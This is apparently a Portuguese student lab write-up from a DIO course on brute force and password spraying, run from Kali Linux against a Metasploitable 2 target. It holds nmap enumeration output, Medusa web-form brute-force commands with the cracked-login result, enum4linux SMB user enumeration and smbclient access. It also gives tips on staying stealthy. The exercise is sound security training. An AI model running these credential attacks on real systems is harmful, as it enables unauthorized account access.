# LAboratorio Dio - Apreentação de Brute Force e password Sparying usando Kali linux.

O alvo é uma maquina com o linux Metesploitable

# Preparando o ambiente com Kali Linux e Matesploitable 2
❌	https://www.youtube.com/watch?v=nVncYYHj5Tw
	 Usando o Kali linux no virtualbox
Preparando o ambiente com Kali Linux e Matesploitable 2



Vamos montar duas maquinas,elas devem se comunicar para podermos fazer elas se conectarem
‼️ Em Rede > Ligado a > Selecione: Placa de rede exclusiva de hospedeiro (host-only)
‼️ Dica: Use um snapshot, assim salva um backup da aquina virtual para quando ela colapse.

Maquina 1: Kali linux, maquina atacante

Maaquina 2: Metesploitable, a maquina alvo
	Login: msfadmin   senha: msfadmin

‼️ Snapshot: Maquina > Snapshot

MAC Address: 08:00:27:46:B9:53 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.101

# Alcançando a maquina vulneravel no Matesploitable 2
https://www.youtube.com/watch?v=ieRokGUqLY8&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

## Objetivo, testar as vulnerabilidades da Maquina 2, que esta simulando um servidor desatualizado.
	Foco: Serviço STP

### Passo 1: Ip do alvo
	Ping para a maquina e verifique se esta na mesma rede dela.
	comando: ping -c 3 192.0.0.0

### Passo 2: Enumeração
	Devemos descobrir quais portas e serviços estão em operação, abertos e vulneraveis.
	para isso usamos o Nmap, vamos escanear diretamente as portas que temos interesse.
	comando:
	nmap -sV-p 21,22,80,445,139 192.0.0.0
O que cada parte significa

nmap — a ferramenta de varredura de rede.

* -sV — detecção de versão: tenta identificar o serviço e versão rodando em portas abertas (ex.: “OpenSSH 8.2p1”, “Apache 2.4.41”). *

-p 21,22,80,445,139 — especifica as portas a serem escaneadas (apenas essas cinco):
21 = FTP   22 = SS  H80 = HTTP  139 e 445 = NetBIOS/SMB (Windows file sharing)
	O parametro -sV tenta verificar as versões dos serviços operantes.

### Retorno do Nmap

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 18:51 EDT
Nmap scan report for 192.168.X.101
Host is up (0.00032s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:C5:76:A8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel



## Criando nome de usuário e senhas comuns em diferentes arquivos
❌ https://www.youtube.com/watch?v=1Ev-L2eRhyA&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE	

Criamos uma wordList, com usuarios e senhas


### O Curso da dio Sugere isso aqui >>>>
comando, criara um arquivo com possiveis nomes na mão e na marra, pq a professora ja sabe a resposta kkkkk:
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt

senhas, criaremos um arquivo com as possiveis senhas:
echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt

### Eu vou usar as wordList do Kali

Nativamente no Klai podemos achar WordList padrões e genericas para diferentes finalidades dentro de:

***/usr/share/wordlists/***

Para Usuarios, usaremos a lista:
http_default_users.txt

Para senha, usaremos  lista: default_userpass_for_services_unhash.txt



## Ataques de força bruta aplicados em formulários de login em sistemas web

https://www.youtube.com/watch?v=_vFgoPlz6-8

Para atacar logins web é bom aprender por de traz qual o formulario usado, precisamos entender para explorar fraquezas montadas. 

Ao explorar no navegador como atravez da inspeção da Network podemos descobrir os detalhes

## Utilizando o Meduza para simular combinações entre usuários e senhas
https://www.youtube.com/watch?v=Yc5s7T_plao&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

Vamos usar a medusa para atacar um servidor web, mais especificamente atazvez de um formulario de login mal contruido vamos explorar para entrar. O formulario revela qual os parametros que o servidor espera receber, assim como o retorno que o servidor entrega.

comando:
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
	-m PAGE: '/alvo/formulario.php' \
	-m FORM:'username=ÛSER^&password=^PASS^&Login=Login' \
	-m 'FAIL=Login faildes' -t 6

[SUCESSO] esse comando ai rodar nossas word list, nos entregando logins validos para o site.



 Resposta:
 2025-10-02 20:44:50 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (1 of 4 complete)
2025-10-02 20:44:50 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: msfadmin [SUCCESS]

~Dica ! Use o comando para descobrir quais os parametros que o formulario pode requisitar~
 ~medusa -M http -q~

## Ataque em cadeia, enumeração smb + password spraying
https://www.youtube.com/watch?v=jVr9gG3nclg&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE


O foco é descobrir um login valido num alvo, e depois fica facil entrar com a senha rs

Seviço SMB, server mensage block, protocolo da microsoft para compartilhar arquivos, pastas e impressoras alem de validar usuarios, eles usam SAMBA para comunicação entre maquinas.  Ele comartilha arquivos dentro de uma rede interna.

(( Vamos usar a implementação Opensource))

 

## Simulando um cenário comum em ambiente corporativo mal configurado

https://www.youtube.com/watch?v=1jZPp-u20FM

Simularemos: Conseguimos acesso fisico a uma rede, e descobrimos um SMB ativo e vamos tentar entrar nele.
tentar ser furtivo.

Usaremos password spraying, onde invertemos a ordem, vamos testar varios usuarios para a mesma senha.

Sistemas de segurança podem detectar caso muitos usuarios inesistentem sejam requisitados e nos bloquear. para começar vamso descobrir usuarios validos, e deposi testar senhas comuns


Etapa 1 -Enumeração de usuarios com enum4linux vamos descobrir quais os usuarios reais do sistema, ele vai interagir com o usuario SMB, ele estando mal configurado o enum4linux  extrai listas e protocolos e regras internar usados pelo SMB mal configurado.

Comando, enum4linux  parametro -a ativa as tecnicas de enumeração. tee salva os dados achados:
enum4linux -a 192.0.0.0 | tee enum4_output.txt


# Criando uma lista de usuários - com os dados do enum4linux 
 
https://www.youtube.com/watch?v=fQLlZsLe_4Y&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

# Testando o acesso utilizando smbclient
https://www.youtube.com/watch?v=q-kk9GYUg_o

Entrando usando os dados que coletamos
comando:
smbclient -L //192.0.0.0 -U user



-----------------
src="https://www.youtube.com/embed/


https://www.youtube.com/watch?v=1jZPp-u20FM